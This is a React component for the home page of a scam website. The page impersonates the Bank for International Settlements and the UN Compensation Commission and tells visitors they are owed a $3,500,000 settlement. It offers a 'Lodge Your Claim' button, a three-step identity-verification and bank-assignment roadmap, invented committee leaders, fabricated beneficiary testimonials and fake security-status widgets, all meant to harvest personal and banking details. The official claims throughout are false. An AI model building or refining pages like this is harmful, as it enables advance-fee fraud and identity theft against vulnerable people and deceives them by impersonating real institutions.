
import React from 'react';
import { motion } from 'framer-motion';
import { 
  ShieldCheck, 
  Mail, 
  Landmark, 
  ArrowRight, 
  Globe, 
  Star, 
  Quote, 
  CheckCircle2, 
  Calculator,
  UserCheck,
  ShieldAlert,
  Scale,
  Handshake,
  Lock,
  Building2,
  Users
} from 'lucide-react';
import { fadeInUp, staggerContainer } from '../lib/animations';
import MotionButton from '../components/MotionButton';

interface HomeProps {
  onStart: () => void;
}

const Home: React.FC<HomeProps> = ({ onStart }) => {
  return (
    <div className="pt-24 pb-16 overflow-hidden">
      {/* Hero Section */}
      <section className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mb-24 min-h-[70vh] flex items-center">
        {/* Dynamic Background Elements */}
        <div className="absolute inset-0 -z-10">
          <motion.div
            animate={{
              scale: [1, 1.2, 1],
              opacity: [0.3, 0.5, 0.3],
              x: [0, 50, 0],
              y: [0, -30, 0],
            }}
            transition={{
              duration: 15,
              repeat: Infinity,
              ease: "linear"
            }}
            className="absolute top-0 -left-20 w-96 h-96 bg-blue-100 rounded-full blur-3xl"
          />
          <motion.div
            animate={{
              scale: [1, 1.1, 1],
              opacity: [0.2, 0.4, 0.2],
              x: [0, -50, 0],
              y: [0, 30, 0],
            }}
            transition={{
              duration: 12,
              repeat: Infinity,
              ease: "linear",
              delay: 2
            }}
            className="absolute bottom-0 right-0 w-[500px] h-[500px] bg-slate-100 rounded-full blur-3xl"
          />
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_30%_20%,rgba(59,130,246,0.05)_0%,transparent_50%)]" />
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center w-full">
          <motion.div 
            variants={fadeInUp}
            initial="initial"
            animate="animate"
            className="space-y-6 text-left relative z-10"
          >
            <motion.div 
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: 0.1 }}
              className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-blue-50 border border-blue-100 text-blue-700 text-sm font-semibold mb-4"
            >
              <Landmark className="w-4 h-4" />
              Official Resolution BIS/CPM/025
            </motion.div>
            <h1 className="text-5xl md:text-6xl font-extrabold text-slate-900 tracking-tight leading-tight">
              Approved Settlement of <br />
              <motion.span 
                initial={{ backgroundPosition: '0% 50%' }}
                animate={{ backgroundPosition: ['0% 50%', '100% 50%', '0% 50%'] }}
                transition={{ duration: 5, repeat: Infinity, ease: "linear" }}
                className="text-transparent bg-clip-text bg-gradient-to-r from-blue-700 via-blue-500 to-blue-700 bg-[length:200%_auto]"
              >
                $3,500,000.00
              </motion.span>
            </h1>
            <p className="text-xl text-slate-600 leading-relaxed max-w-xl">
              The Bank for International Settlement (BIS), in conjunction with the United Nations Compensation Commission (UNCC), 
              hereby acknowledges the approval of your recovery and compensation payment.
            </p>
            <div className="flex flex-col sm:flex-row gap-4 pt-4">
              <MotionButton onClick={onStart} variant="primary" className="text-lg px-8 py-4 bg-blue-700 hover:bg-blue-800 shadow-xl shadow-blue-500/20">
                Lodge Your Claim Now <ArrowRight className="w-5 h-5" />
              </MotionButton>
              <MotionButton variant="outline" className="text-lg px-8 py-4 border-slate-200">
                Policy Document 2025
              </MotionButton>
            </div>
          </motion.div>
          
          <motion.div 
            initial={{ opacity: 0, x: 40 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 1, ease: [0.22, 1, 0.36, 1], delay: 0.2 }}
            className="relative hidden lg:block"
          >
            <div className="relative z-10 rounded-3xl overflow-hidden shadow-2xl border-8 border-white group">
              <img 
                src="https://images.unsplash.com/photo-1573163281534-dd428060ef31?auto=format&fit=crop&q=80&w=1200" 
                alt="Institutional Building" 
                className="w-full h-[550px] object-cover transition-transform duration-1000 group-hover:scale-105"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-slate-900/70 via-transparent to-transparent flex items-end p-10">
                <div className="text-white">
                  <p className="text-sm font-bold uppercase tracking-[0.2em] mb-2 text-blue-400">Global Headquarters</p>
                  <p className="text-lg font-medium opacity-90">Basel, Switzerland • International Center for Monetary Stability</p>
                </div>
              </div>
            </div>
            
            <motion.div 
              animate={{ y: [0, -10, 0] }}
              transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
              className="absolute -bottom-10 -left-10 bg-white p-6 rounded-2xl shadow-2xl z-20 border border-slate-100 max-w-xs"
            >
              <div className="flex items-center gap-3 mb-3">
                <div className="p-2 bg-green-50 text-green-600 rounded-lg"><ShieldCheck className="w-6 h-6" /></div>
                <span className="font-bold text-slate-900">Security Status: High</span>
              </div>
              <p className="text-sm text-slate-500 leading-relaxed">
                Database synchronization complete. Your session is authorized under 2025 protocol BIS-UNCC.
              </p>
              <div className="mt-4 h-1.5 w-full bg-slate-100 rounded-full overflow-hidden">
                <motion.div 
                  initial={{ width: 0 }}
                  animate={{ width: "100%" }}
                  transition={{ duration: 2, delay: 1 }}
                  className="h-full bg-green-500"
                />
              </div>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* NEW: Global Oversight & Governance Section */}
      <section className="py-24 bg-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
            <motion.div 
              initial={{ opacity: 0, x: -30 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              className="space-y-8"
            >
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-slate-100 text-slate-600 text-xs font-bold uppercase tracking-widest">
                <Scale className="w-3 h-3" /> Regulatory Framework
              </div>
              <h2 className="text-4xl font-bold text-slate-900">Global Financial Governance & Accountability</h2>
              <p className="text-lg text-slate-600 leading-relaxed">
                The BIS settlement process is governed by a multi-national council of financial experts and diplomats. Our mission is to restore assets to verified individuals through a transparent, high-security pipeline.
              </p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                <div className="flex gap-4">
                  <div className="shrink-0 w-12 h-12 bg-blue-50 rounded-xl flex items-center justify-center">
                    <Building2 className="w-6 h-6 text-blue-700" />
                  </div>
                  <div>
                    <h4 className="font-bold text-slate-900">Institutional Trust</h4>
                    <p className="text-sm text-slate-500">Monitored by central banks across 60+ jurisdictions.</p>
                  </div>
                </div>
                <div className="flex gap-4">
                  <div className="shrink-0 w-12 h-12 bg-blue-50 rounded-xl flex items-center justify-center">
                    <Users className="w-6 h-6 text-blue-700" />
                  </div>
                  <div>
                    <h4 className="font-bold text-slate-900">Direct Support</h4>
                    <p className="text-sm text-slate-500">Dedicated case officers assigned to every claim.</p>
                  </div>
                </div>
              </div>
            </motion.div>
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              whileInView={{ opacity: 1, scale: 1 }}
              viewport={{ once: true }}
              className="grid grid-cols-2 gap-4"
            >
              <div className="space-y-4 pt-8">
                <img 
                  src="https://images.unsplash.com/photo-1556761175-b413da4baf72?auto=format&fit=crop&q=80&w=600" 
                  alt="Board Meeting" 
                  className="rounded-2xl shadow-lg w-full h-64 object-cover"
                />
                <img 
                  src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?auto=format&fit=crop&q=80&w=600" 
                  alt="Financial Professional" 
                  className="rounded-2xl shadow-lg w-full h-48 object-cover"
                />
              </div>
              <div className="space-y-4">
                <img 
                  src="https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&q=80&w=600" 
                  alt="Official Portrait" 
                  className="rounded-2xl shadow-lg w-full h-48 object-cover"
                />
                <img 
                  src="https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=600" 
                  alt="Modern Office" 
                  className="rounded-2xl shadow-lg w-full h-64 object-cover"
                />
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Leadership Section */}
      <section className="bg-slate-50 py-24 border-y border-slate-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Strategic Committee Leadership</h2>
            <p className="text-slate-500">The 2025 Global Settlement is overseen by the Committee on Payment and Market Infrastructures (CPMI).</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
            {[
              {
                name: "Sir David Sterling",
                role: "CPMI Chairman",
                img: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=400"
              },
              {
                name: "Dr. Elena Vance",
                role: "UNCC Lead Commissioner",
                img: "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&q=80&w=400"
              },
              {
                name: "Ambassador Marcus Cole",
                role: "International Liaison",
                img: "https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?auto=format&fit=crop&q=80&w=400"
              },
              {
                name: "Prof. Sarah Chen",
                role: "Asset Recovery Director",
                img: "https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&q=80&w=400"
              }
            ].map((leader, idx) => (
              <motion.div 
                key={idx}
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                transition={{ delay: idx * 0.1 }}
                className="group relative"
              >
                <div className="aspect-[3/4] rounded-2xl overflow-hidden mb-4 relative">
                  <img 
                    src={leader.img} 
                    alt={leader.name} 
                    className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
                  />
                  <div className="absolute inset-0 bg-blue-900/20 group-hover:bg-transparent transition-colors duration-300" />
                </div>
                <h4 className="text-lg font-bold text-slate-900">{leader.name}</h4>
                <p className="text-sm font-semibold text-blue-700 uppercase tracking-tighter">{leader.role}</p>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Process Roadmap */}
      <section className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-24">
        <div className="text-center mb-16">
          <h2 className="text-3xl font-bold text-slate-900 mb-4">Claim Verification Roadmap</h2>
          <p className="text-slate-500">Follow these 3 simple steps to secure your recovery funds.</p>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-12 relative">
          <div className="hidden md:block absolute top-1/2 left-0 w-full h-0.5 bg-slate-100 -z-10" />
          {[
            {
              step: "01",
              icon: <Mail className="w-6 h-6" />,
              title: "Verify Identity",
              desc: "Re-confirm your legal standing against our verified global database of beneficiaries."
            },
            {
              step: "02",
              icon: <Calculator className="w-6 h-6" />,
              title: "Calculate Claim",
              desc: "Official assessment of your $3,500,000.00 recovery total under BIS resolution."
            },
            {
              step: "03",
              icon: <UserCheck className="w-6 h-6" />,
              title: "Disbursement",
              desc: "Final bank assignment and transfer of funds via accredited central channels."
            }
          ].map((item, idx) => (
            <motion.div 
              key={idx}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ delay: idx * 0.2 }}
              className="bg-white p-8 rounded-3xl border border-slate-200 shadow-sm text-center relative"
            >
              <div className="absolute -top-4 left-1/2 -translate-x-1/2 bg-blue-700 text-white text-xs font-bold px-3 py-1 rounded-full">
                STEP {item.step}
              </div>
              <div className="w-16 h-16 bg-blue-50 text-blue-700 rounded-2xl flex items-center justify-center mx-auto mb-6">
                {item.icon}
              </div>
              <h4 className="text-xl font-bold text-slate-900 mb-3">{item.title}</h4>
              <p className="text-slate-500 text-sm leading-relaxed">{item.desc}</p>
            </motion.div>
          ))}
        </div>
      </section>

      {/* Trust & Compliance Section */}
      <section className="py-24 bg-blue-50/50 border-y border-blue-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <motion.div initial={{ opacity: 0 }} whileInView={{ opacity: 1 }} className="text-center mb-16">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Institutional Trust & Compliance</h2>
            <p className="text-slate-600 max-w-2xl mx-auto">Ensuring a secure, transparent, and equitable settlement process under global financial oversight.</p>
          </motion.div>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <motion.div whileHover={{ y: -5 }} className="bg-white p-8 rounded-3xl border-2 border-red-100 shadow-sm relative overflow-hidden">
              <div className="absolute top-0 right-0 p-4 opacity-10"><ShieldAlert className="w-24 h-24 text-red-600" /></div>
              <div className="flex items-center gap-4 mb-6">
                <div className="w-12 h-12 bg-red-50 text-red-600 rounded-xl flex items-center justify-center"><Lock className="w-6 h-6" /></div>
                <h3 className="text-xl font-bold text-slate-900">Anti-Fraud Protection</h3>
              </div>
              <p className="text-slate-600 leading-relaxed mb-6">
                <strong>Important Notice:</strong> The BIS-UNCC Global Settlement Committee will <span className="text-red-600 font-bold uppercase mx-1">never</span> ask for your private passwords, PINs, or crypto keys.
              </p>
              <ul className="space-y-3 text-sm text-slate-500">
                <li className="flex items-start gap-3"><CheckCircle2 className="w-4 h-4 text-green-500 shrink-0 mt-0.5" /> Official communication only via bis.org portals.</li>
                <li className="flex items-start gap-3"><CheckCircle2 className="w-4 h-4 text-green-500 shrink-0 mt-0.5" /> Transfers executed via central bank-accredited channels.</li>
              </ul>
            </motion.div>
            <motion.div whileHover={{ y: -5 }} className="bg-white p-8 rounded-3xl border border-blue-100 shadow-sm relative overflow-hidden">
              <div className="absolute top-0 right-0 p-4 opacity-10"><Handshake className="w-24 h-24 text-blue-600" /></div>
              <div className="flex items-center gap-4 mb-6">
                <div className="w-12 h-12 bg-blue-50 text-blue-600 rounded-xl flex items-center justify-center"><Scale className="w-6 h-6" /></div>
                <h3 className="text-xl font-bold text-slate-900">Regulatory Compliance</h3>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-sm font-bold text-blue-700 mb-2 uppercase tracking-tighter">BIS 2025 Policy</h4>
                  <p className="text-xs text-slate-500 leading-relaxed">Adheres to the CPMI framework for cross-border payment efficiency.</p>
                </div>
                <div>
                  <h4 className="text-sm font-bold text-blue-700 mb-2 uppercase tracking-tighter">UNCC Partnership</h4>
                  <p className="text-xs text-slate-500 leading-relaxed">Monitored by the UN to ensure equitable fund distribution.</p>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="bg-slate-900 py-24 overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col md:flex-row justify-between items-end mb-16 gap-6">
            <div className="max-w-2xl text-left">
              <h2 className="text-3xl md:text-4xl font-bold text-white mb-4">Successful Beneficiary Stories</h2>
              <p className="text-slate-400">Join thousands of individuals who have recovered their lost funds through our 2025 global initiative.</p>
            </div>
            <div className="flex gap-2 items-center bg-slate-800/50 p-4 rounded-2xl border border-slate-700">
              <div className="flex -space-x-3">
                {[1,2,3,4].map(i => (
                  <div key={i} className="w-10 h-10 rounded-full border-2 border-slate-900 overflow-hidden bg-slate-700">
                    <img src={`https://i.pravatar.cc/100?img=${i+10}`} alt="user" className="w-full h-full object-cover" />
                  </div>
                ))}
              </div>
              <div className="pl-4">
                <div className="flex gap-0.5 mb-1">
                  {[1,2,3,4,5].map(i => <Star key={i} className="w-3 h-3 fill-yellow-500 text-yellow-500" />)}
                </div>
                <p className="text-[10px] text-slate-400 font-medium uppercase tracking-widest">4.9/5 verified reviews</p>
              </div>
            </div>
          </div>
          <motion.div variants={staggerContainer} initial="initial" whileInView="animate" className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {[
              {
                name: "Robert M. Jenkins",
                role: "UK Business Owner",
                img: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=200",
                text: "The verification process was very professional. I received my full $3.5M settlement within 48 hours of my claim being lodged with the assigned bank.",
                recovery: "$3,500,000.00"
              },
              {
                name: "Maria Rodriguez",
                role: "Tech Consultant",
                img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&q=80&w=200",
                text: "After losing access to my crypto holdings in 2023, the UNCC compensation committee restored my financial security. The BIS portal is truly life-changing.",
                recovery: "$3,500,000.00"
              },
              {
                name: "James T. Marcus",
                role: "Retired Educator",
                img: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?auto=format&fit=crop&q=80&w=200",
                text: "I was hesitant, but the official nature of the BIS/CPM/025 documents convinced me. The assigned bank was efficient and handled everything perfectly.",
                recovery: "$3,500,000.00"
              }
            ].map((t, idx) => (
              <motion.div key={idx} variants={fadeInUp} className="bg-slate-800/50 border border-slate-700 p-8 rounded-3xl relative hover:border-blue-500/50 transition-colors group">
                <Quote className="absolute top-6 right-8 w-12 h-12 text-blue-500/10 group-hover:text-blue-500/20 transition-colors" />
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-14 h-14 rounded-2xl overflow-hidden border-2 border-slate-700">
                    <img src={t.img} alt={t.name} className="w-full h-full object-cover" />
                  </div>
                  <div>
                    <h5 className="text-white font-bold">{t.name}</h5>
                    <p className="text-blue-400 text-[10px] font-bold uppercase tracking-widest">{t.role}</p>
                  </div>
                </div>
                <p className="text-slate-300 text-sm italic leading-relaxed mb-6">"{t.text}"</p>
                <div className="pt-4 border-t border-slate-700 flex justify-between items-center">
                  <span className="text-xs font-bold text-slate-500 uppercase tracking-widest">Disbursed</span>
                  <span className="text-green-400 font-bold font-mono">{t.recovery}</span>
                </div>
              </motion.div>
            ))}
          </motion.div>
        </div>
      </section>

      {/* Official Status */}
      <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-24">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-12 items-center">
          <motion.div initial={{ opacity: 0, x: -20 }} whileInView={{ opacity: 1, x: 0 }}>
            <h2 className="text-3xl font-bold text-slate-900 mb-6">Global Policy Resolution</h2>
            <p className="text-slate-600 mb-6 leading-relaxed">
              As part of the 2025 initiative by the CPMI, your session is authorized for direct settlement of three million five hundred thousand US dollars ($3,500,000.00).
            </p>
            <ul className="space-y-4">
              <li className="flex items-center gap-3 text-slate-700 font-semibold text-sm">
                <CheckCircle2 className="w-5 h-5 text-green-500" /> Irrevocable & Indivisible Allocation
              </li>
              <li className="flex items-center gap-3 text-slate-700 font-semibold text-sm">
                <CheckCircle2 className="w-5 h-5 text-green-500" /> Non-Transferable To Third Parties
              </li>
              <li className="flex items-center gap-3 text-slate-700 font-semibold text-sm">
                <CheckCircle2 className="w-5 h-5 text-green-500" /> Authorized Central Bank Disbursement
              </li>
            </ul>
          </motion.div>
          <motion.div initial={{ opacity: 0, scale: 0.9 }} whileInView={{ opacity: 1, scale: 1 }} className="glass rounded-3xl p-8 border border-slate-200 relative overflow-hidden bg-white/40">
            <h3 className="text-xl font-bold text-slate-900 mb-4">Official Verification</h3>
            <p className="text-sm text-slate-500 mb-6 italic leading-relaxed">"Confirmation of legal standing is required to enable the final crediting of funds to File BIS/CPM/025."</p>
            <div className="space-y-4">
              <div className="h-2.5 w-full bg-slate-100 rounded-full overflow-hidden">
                <motion.div initial={{ width: 0 }} whileInView={{ width: '100%' }} transition={{ duration: 1.5 }} className="h-full bg-blue-600 rounded-full" />
              </div>
              <div className="flex justify-between text-[10px] font-bold text-slate-400 uppercase tracking-widest">
                <span>Database Selection</span>
                <span className="text-blue-600">Verification</span>
                <span>Payment</span>
              </div>
            </div>
            <div className="mt-8 pt-6 border-t border-slate-100 flex items-center justify-center gap-4">
              <img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/UN_emblem_blue.svg" alt="UN Logo" className="h-8 opacity-20" />
              <div className="h-6 w-px bg-slate-200" />
              <Landmark className="h-6 text-slate-200" />
            </div>
          </motion.div>
        </div>
      </section>
    </div>
  );
};

export default Home;
